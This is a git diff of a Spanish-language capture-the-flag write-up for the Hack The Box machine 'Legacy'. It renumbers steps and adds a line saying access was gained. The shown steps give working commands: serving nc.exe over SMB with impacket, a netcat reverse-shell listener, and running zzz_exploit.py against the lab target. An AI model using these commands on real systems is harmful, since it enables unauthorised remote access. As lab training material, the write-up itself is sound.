@@ -53,19 +53,22 @@ Comentamos las lineas que ya no queremos que se ejecuten (flecha de arriba) e in
 
 3.- Ejecutamos el exploit
 Para ejecutar el exploit tenemos que hacer varias cosas.
-   1.- Compartimos una ruta de la cual vamos a coger el nc.exe con impacket y le indicamos que soporte smb2
+   
+   3.1.- Compartimos una ruta de la cual vamos a coger el nc.exe con impacket y le indicamos que soporte smb2
                                 
       impacket-smbserver smb $(pwd) -smb2support
       
-   2.- Ponemos el puerto configuracido para la reverse shell a la escucha en nuestra maquina 
+   3.2.- Ponemos el puerto configuracido para la reverse shell a la escucha en nuestra maquina 
     
       nc -lvp 4444
 
-   3.- Ejecutamos el zzz_exploit.py
+   3.3.- Ejecutamos el zzz_exploit.py
    
     python2 zzz_exploit.py 10.10.10.4 spoolss
-
 ![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/accesLegacy.jpg)
+
+Conseguimos acceso a la maquina
+
 ![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/acceso.jpg)
     
 Accedemos a la carpeta del usuario y en el escritorio encontramos la flag  
